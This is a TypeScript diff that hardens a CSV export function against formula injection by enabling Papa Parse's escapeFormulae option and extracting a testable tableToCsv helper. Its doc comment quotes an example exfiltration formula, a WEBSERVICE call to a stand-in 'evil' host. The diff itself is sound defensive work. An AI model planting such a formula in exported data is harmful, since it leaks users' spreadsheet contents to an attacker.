@@ -38,8 +38,22 @@ export async function downloadChartAsPng(el: HTMLElement, filename: string): Pro
   triggerDownload(dataUrl, `${sanitizeFilename(filename)}.png`);
 }
 
+/**
+ * Serialize a table to CSV text with formula-injection protection.
+ *
+ * escapeFormulae guards against CSV formula injection: a cell whose text starts
+ * with = + - @ (or tab/CR) is treated as a formula by Excel/Sheets, so an
+ * exported value like `=WEBSERVICE("http://evil/?"&A1)` would EXECUTE on open and
+ * exfiltrate. Papa prefixes those cells with a `'` so they render as literal text.
+ * Extracted (and exported) from downloadTableAsCsv so the escaping is unit-testable
+ * without the DOM download side effect.
+ */
+export function tableToCsv(headers: string[], rows: string[][]): string {
+  return Papa.unparse({ fields: headers, data: rows }, { escapeFormulae: true });
+}
+
 export function downloadTableAsCsv(headers: string[], rows: string[][], filename: string): void {
-  const csv = Papa.unparse({ fields: headers, data: rows });
+  const csv = tableToCsv(headers, rows);
   const blob = new Blob([csv], { type: "text/csv;charset=utf-8;" });
   const url = URL.createObjectURL(blob);
   triggerDownload(url, `${sanitizeFilename(filename)}.csv`);
